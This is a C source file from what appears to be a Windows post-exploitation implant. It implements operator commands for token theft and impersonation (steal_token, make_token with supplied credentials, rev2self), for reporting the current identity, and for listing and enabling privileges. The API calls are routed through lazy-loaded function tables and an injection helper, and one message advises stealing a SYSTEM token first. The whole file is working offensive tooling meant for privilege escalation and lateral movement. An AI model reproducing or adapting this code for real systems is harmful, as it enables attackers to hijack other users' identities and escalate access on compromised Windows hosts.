#include "commands.h"
#include "inject.h"
#include "adv_lazy.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* one active impersonation token at a time */
static volatile HANDLE s_imp_token = NULL;

static void _token_info(HANDLE htok, char *out, size_t outsz)
{
    /* get username */
    DWORD needed = 0;
    GetTokenInformation(htok, TokenUser, NULL, 0, &needed);
    TOKEN_USER *tu = needed ? (TOKEN_USER *)malloc(needed) : NULL;
    char uname[256] = "?", domain[256] = "?";
    if (tu && GetTokenInformation(htok, TokenUser, tu, needed, &needed)) {
        DWORD nlen = 256, dlen = 256;
        SID_NAME_USE use;
        LookupAccountSidA(NULL, tu->User.Sid, uname, &nlen, domain, &dlen, &use);
    }
    free(tu);

    /* get integrity level */
    needed = 0;
    GetTokenInformation(htok, TokenIntegrityLevel, NULL, 0, &needed);
    TOKEN_MANDATORY_LABEL *tml = needed ? (TOKEN_MANDATORY_LABEL *)malloc(needed) : NULL;
    const char *integ = "?";
    if (tml && GetTokenInformation(htok, TokenIntegrityLevel, tml, needed, &needed)) {
        DWORD rid = *GetSidSubAuthority(tml->Label.Sid,
                        (DWORD)(*GetSidSubAuthorityCount(tml->Label.Sid) - 1));
        if      (rid >= SECURITY_MANDATORY_SYSTEM_RID) integ = "SYSTEM";
        else if (rid >= SECURITY_MANDATORY_HIGH_RID)   integ = "HIGH";
        else if (rid >= SECURITY_MANDATORY_MEDIUM_RID) integ = "MEDIUM";
        else if (rid >= SECURITY_MANDATORY_LOW_RID)    integ = "LOW";
        else                                            integ = "UNTRUSTED";
    }
    free(tml);

    /* check impersonation type */
    TOKEN_TYPE ttype = TokenPrimary;
    DWORD ttsz = sizeof(ttype);
    GetTokenInformation(htok, TokenType, &ttype, ttsz, &ttsz);
    const char *imp = "";
    if (ttype == TokenImpersonation) {
        SECURITY_IMPERSONATION_LEVEL lvl = SecurityAnonymous;
        DWORD lsz = sizeof(lvl);
        GetTokenInformation(htok, TokenImpersonationLevel, &lvl, lsz, &lsz);
        imp = (lvl == SecurityDelegation)    ? " [delegation]"
            : (lvl == SecurityImpersonation) ? " [impersonation]"
            :                                  " [anonymous/identify]";
    }

    snprintf(out, outsz, "%s\\%s  [%s]%s\n", domain, uname, integ, imp);
}

int cmd_getuid(char *output_buf, size_t output_size)
{
    if (!output_buf || output_size < 64) return -1;
    output_buf[0] = '\0';

    /* try thread token first, fall back to process token */
    HANDLE htok = NULL;
    { const adv_api_t *_a = adv_get();
      if (!_a->OpenThreadToken || !_a->OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &htok) || !htok)
          if (_a->OpenProcessToken) _a->OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htok); }

    if (!htok) {
        snprintf(output_buf, output_size,
                 "[getuid] OpenToken failed: %lu\n", GetLastError());
        return -1;
    }
    _token_info(htok, output_buf, output_size);
    CloseHandle(htok);
    return 0;
}

int cmd_steal_token(unsigned long pid, char *output_buf, size_t output_size)
{
    if (!output_buf || output_size < 64) return -1;
    output_buf[0] = '\0';

    HANDLE hproc = inject_nt_open_process((DWORD)pid, PROCESS_QUERY_INFORMATION);
    if (!hproc) {
        snprintf(output_buf, output_size,
                 "[st] open(%lu) failed\n", pid);
        return -1;
    }

    HANDLE hptok = NULL;
    { const adv_api_t *_a = adv_get();
      if (!_a->OpenProcessToken || !_a->OpenProcessToken(hproc,
                              TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
                              &hptok)) {
          CloseHandle(hproc);
          snprintf(output_buf, output_size,
                   "[st] OpenProcessToken failed: %lu\n", GetLastError());
          return -1;
      } }
    CloseHandle(hproc);

    HANDLE hdup = NULL;
    { const adv_api_t *_a = adv_get();
      if (!_a->DuplicateTokenEx || !_a->DuplicateTokenEx(hptok, TOKEN_ALL_ACCESS, NULL,
                              SecurityImpersonation, TokenImpersonation, &hdup)) {
          CloseHandle(hptok);
          snprintf(output_buf, output_size,
                   "[st] DuplicateTokenEx failed: %lu\n", GetLastError());
          return -1;
      } }
    CloseHandle(hptok);

    { const adv_api_t *_a = adv_get();
      if (!_a->ImpersonateLoggedOnUser || !_a->ImpersonateLoggedOnUser(hdup)) {
          CloseHandle(hdup);
          snprintf(output_buf, output_size,
                   "[st] ImpersonateLoggedOnUser failed: %lu\n",
                   GetLastError());
          return -1;
      } }

    /* Atomically swap stored token, close old one if any */
    HANDLE old = (HANDLE)InterlockedExchangePointer(
                     (volatile PVOID *)&s_imp_token, hdup);
    if (old) CloseHandle(old);

    char info[256] = {0};
    _token_info(hdup, info, sizeof(info));
    snprintf(output_buf, output_size,
             "[st] pid=%lu -> %s", pid, info);
    return 0;
}

int cmd_rev2self(char *output_buf, size_t output_size)
{
    if (!output_buf || output_size < 64) return -1;
    output_buf[0] = '\0';

    { const adv_api_t *_a = adv_get(); if (_a->RevertToSelf) _a->RevertToSelf(); }
    HANDLE old = (HANDLE)InterlockedExchangePointer(
                     (volatile PVOID *)&s_imp_token, NULL);
    if (old) CloseHandle(old);

    snprintf(output_buf, output_size, "[r2s] reverted\n");
    return 0;
}

int cmd_make_token(const char *domain_user, const char *password,
                   char *output_buf, size_t output_size)
{
    if (!output_buf || output_size < 64) return -1;
    output_buf[0] = '\0';

    /* Split "DOMAIN\user" → domain + user; bare "user" defaults domain to "." */
    char domain[256] = ".";
    char user[256]   = {0};
    const char *bs = strchr(domain_user, '\\');
    if (bs) {
        size_t dlen = (size_t)(bs - domain_user);
        if (dlen >= sizeof(domain)) dlen = sizeof(domain) - 1;
        memcpy(domain, domain_user, dlen);
        domain[dlen] = '\0';
        strncpy(user, bs + 1, sizeof(user) - 1);
    } else {
        strncpy(user, domain_user, sizeof(user) - 1);
    }

    HANDLE htok = NULL;
    /*
     * LOGON32_LOGON_NEW_CREDENTIALS: local identity stays current user;
     * network auth uses provided creds. Equivalent to runas /netonly.
     * Does not require SeDebugPrivilege.
     */
    { const adv_api_t *_a = adv_get();
      if (!_a->LogonUserA || !_a->LogonUserA(user, domain, password,
                      LOGON32_LOGON_NEW_CREDENTIALS,
                      LOGON32_PROVIDER_WINNT50,
                      &htok)) {
          snprintf(output_buf, output_size,
                   "[mt] LogonUser failed: %lu\n", GetLastError());
          return -1;
      } }

    { const adv_api_t *_a = adv_get();
      if (!_a->ImpersonateLoggedOnUser || !_a->ImpersonateLoggedOnUser(htok)) {
          CloseHandle(htok);
          snprintf(output_buf, output_size,
                   "[mt] ImpersonateLoggedOnUser failed: %lu\n",
                   GetLastError());
          return -1;
      } }

    HANDLE old = (HANDLE)InterlockedExchangePointer(
                     (volatile PVOID *)&s_imp_token, htok);
    if (old) CloseHandle(old);

    snprintf(output_buf, output_size,
             "[mt] %s\\%s  (network creds set)\n", domain, user);
    return 0;
}

/* ---- cmd_privs ---- */

int cmd_privs(const char *action, const char *priv_name,
              char *output_buf, size_t output_size)
{
    const adv_api_t *adv = adv_get();
    HANDLE hTok;
    if (!adv->OpenProcessToken ||
        !adv->OpenProcessToken(GetCurrentProcess(),
                               TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hTok)) {
        snprintf(output_buf, output_size,
                 "[privs] OpenProcessToken failed: %lu\n", GetLastError());
        return -1;
    }

    /* Default action = list */
    if (!action || !action[0] || strcmp(action, "list") == 0) {
        DWORD needed = 0;
        GetTokenInformation(hTok, TokenPrivileges, NULL, 0, &needed);
        TOKEN_PRIVILEGES *tp = (TOKEN_PRIVILEGES *)malloc(needed);
        if (!tp) { CloseHandle(hTok); return -1; }
        GetTokenInformation(hTok, TokenPrivileges, tp, needed, &needed);

        size_t pos = 0;
        int n = snprintf(output_buf + pos, output_size - pos,
                         "%-48s  %s\n", "Privilege", "State");
        if (n > 0) pos += (size_t)n;

        for (DWORD i = 0; i < tp->PrivilegeCount; i++) {
            char name[64] = {0};
            DWORD nsz = sizeof(name);
            if (adv->LookupPrivilegeNameA)
                adv->LookupPrivilegeNameA(NULL, &tp->Privileges[i].Luid, name, &nsz);

            DWORD attr = tp->Privileges[i].Attributes;
            const char *state =
                (attr & SE_PRIVILEGE_ENABLED)            ? "Enabled"  :
                (attr & SE_PRIVILEGE_ENABLED_BY_DEFAULT) ? "Default"  :
                                                           "Disabled";

            n = snprintf(output_buf + pos, output_size - pos,
                         "  %-46s  %s\n", name, state);
            if (n > 0 && (size_t)n < output_size - pos) pos += (size_t)n;
        }
        free(tp);
        CloseHandle(hTok);
        return 0;
    }

    if (strcmp(action, "enable") == 0 || strcmp(action, "disable") == 0) {
        if (!priv_name || !priv_name[0]) {
            snprintf(output_buf, output_size,
                     "[privs] usage: privs enable|disable <SeXxxPrivilege>\n");
            CloseHandle(hTok);
            return -1;
        }
        LUID luid;
        if (!adv->LookupPrivilegeValueA ||
            !adv->LookupPrivilegeValueA(NULL, priv_name, &luid)) {
            snprintf(output_buf, output_size,
                     "[privs] unknown privilege: %s\n", priv_name);
            CloseHandle(hTok);
            return -1;
        }
        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount           = 1;
        tp.Privileges[0].Luid       = luid;
        tp.Privileges[0].Attributes =
            (strcmp(action, "enable") == 0) ? SE_PRIVILEGE_ENABLED : 0;

        if (adv->AdjustTokenPrivileges)
            adv->AdjustTokenPrivileges(hTok, FALSE, &tp, 0, NULL, NULL);
        DWORD err = GetLastError();
        CloseHandle(hTok);

        if (err == ERROR_SUCCESS) {
            snprintf(output_buf, output_size,
                     "[privs] %s: %s\n", action, priv_name);
            return 0;
        }
        if (err == ERROR_NOT_ALL_ASSIGNED) {
            snprintf(output_buf, output_size,
                     "[privs] %s: %s  (not held by token - steal SYSTEM token first)\n",
                     action, priv_name);
            return -1;
        }
        snprintf(output_buf, output_size,
                 "[privs] failed: %lu\n", err);
        return -1;
    }

    CloseHandle(hTok);
    snprintf(output_buf, output_size,
             "[privs] usage: privs [list | enable <name> | disable <name>]\n");
    return -1;
}
